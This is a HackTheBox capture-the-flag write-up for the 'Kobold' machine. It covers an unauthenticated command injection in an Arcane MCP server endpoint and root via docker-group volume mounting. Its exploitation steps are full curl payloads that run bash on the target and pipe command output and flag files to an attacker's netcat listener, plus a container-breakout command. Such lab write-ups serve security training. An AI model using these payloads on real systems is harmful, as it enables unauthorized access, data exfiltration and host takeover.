<div align="center">

# Kobold — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**


---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | Kobold |
| IP | `<TARGET_IP>` |
| OS | Linux |
| Difficulty | Easy |
| Hostname | kobold.htb |

## Table of Contents

1. [Overview](#overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Service Enumeration](#service-enumeration)
4. [Vulnerability Discovery](#vulnerability-discovery)
5. [Exploitation](#exploitation)
6. [Privilege Escalation](#privilege-escalation)
7. [Flags](#flags)
8. [Summary](#summary)

---

## Overview

Key points:

- Unauthenticated command injection in Arcane MCP Server (CVE-2026-23520)
- Docker group membership privilege escalation
- Container breakout via volume mounting

---

## Initial Reconnaissance

### Add Host to /etc/hosts

```bash
sudo echo "<TARGET_IP> kobold.htb mcp.kobold.htb" >> /etc/hosts
```

### Nmap Scan

```bash
nmap -sC -sV -p- --min-rate=1000 <TARGET_IP>
```

<details>
<summary>Nmap Results</summary>

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
443/tcp  open  ssl/http nginx 1.18.0 (Ubuntu)
3552/tcp open  unknown
```

</details>

---

## Service Enumeration

### Web Server (Port 80/443)

Basic nginx setup - vhost discovery needed.

### Arcane Service (Port 3552)

```bash
curl -s http://<TARGET_IP>:3552/api/openapi.json | head -100
```

Discovered: Arcane Docker Management v1.13.0

### Subdomain Enumeration

```bash
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 0
```

Discovered: `mcp.kobold.htb`

### MCP Server Analysis

```bash
curl -k -s https://mcp.kobold.htb/api/openapi.json | head -50
```

Key Endpoint: `/api/mcp/connect` - MCP server connection endpoint

---

## Vulnerability Discovery

### CVE-2026-23520: Arcane MCP Server Unauthenticated Command Injection

The `/api/mcp/connect` endpoint accepts arbitrary commands without authentication via the `serverConfig.command` parameter.

- **Affected Versions:** Arcane Docker Management v1.13.0
- **CVSS Score:** 9.8 (Critical)

---

## Exploitation

### Step 1: Verify Command Execution

Start a listener on the attacker machine:

```bash
nc -lvnp 9001
```

Send the exploit payload:

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id | nc <YOUR_IP> 9001"],
      "env": {}
    },
    "serverId": "test"
  }'
```

Expected output:

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

### Step 2: Capture User Flag

```bash
# Start listener
nc -lvnp 9001

# Send payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "cat /home/ben/user.txt | nc <YOUR_IP> 9001"],
      "env": {}
    },
    "serverId": "user"
  }'
```

### Step 3: Check Group Membership

```bash
# Start listener
nc -lvnp 9001

# Send payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "id | nc <YOUR_IP> 9001"],
      "env": {}
    },
    "serverId": "idcheck"
  }'
```

Result:

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

Docker group (GID 111) is missing because command sessions don't inherit secondary groups by default.

---

## Privilege Escalation

### Step 1: Activate Docker Group

Use `sg` (switch group) command to activate the docker group membership:

```bash
# Start listener
nc -lvnp 9001

# Send payload (test docker images)
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "sg",
      "args": ["docker", "-c", "docker images | nc <YOUR_IP> 9001"],
      "env": {}
    },
    "serverId": "docker"
  }'
```

<details>
<summary>Docker Images Output</summary>

```
REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
mysql                         latest    f66b7a288113   6 weeks ago    922MB
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   4 months ago   122MB
```

</details>

### Step 2: Container Breakout via Volume Mount

Mount the host filesystem into a container and read the root flag:

```bash
# Start listener
nc -lvnp 9001

# Send payload
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "sg",
      "args": ["docker", "-c", "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt | nc -w 10 <YOUR_IP> 9001"],
      "env": {}
    },
    "serverId": "rootflag"
  }'
```

Breakdown of the command:

- `sg docker -c` - Execute as docker group member
- `docker run -u root` - Run container as root user (required to read /root/root.txt)
- `-v /:/hostfs` - Mount host filesystem to /hostfs in container
- `--rm` - Remove container after execution
- `--entrypoint cat` - Use cat command instead of default entrypoint
- `privatebin/nginx-fpm-alpine:2.0.2` - Available local image
- `/hostfs/root/root.txt` - Path to root flag on mounted host filesystem

---

## Flags

| Flag | Value |
|------|-------|
| User | `10ff89dbd16ef67d████████████████` |
| Root | `cfffff370705c650████████████████` |

---

## Summary

### Attack Chain

1. Discovered Arcane MCP server on port 3552 and mcp.kobold.htb subdomain
2. CVE-2026-23520 - Unauthenticated command injection in `/api/mcp/connect`
3. Gained command execution as user `ben`
4. Read `/home/ben/user.txt` for user flag
5. Used `sg docker` to activate docker group, then container breakout via volume mount
6. Mounted host filesystem and read `/root/root.txt`

### Key Lessons

- Always check for secondary group memberships with `id` and `groups`
- Use `sg` or `newgrp` to activate group memberships in command execution contexts
- Docker group membership is equivalent to root access (container breakout via volume mount)
- Always enumerate all subdomains and API endpoints

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — Kobold*

</div>
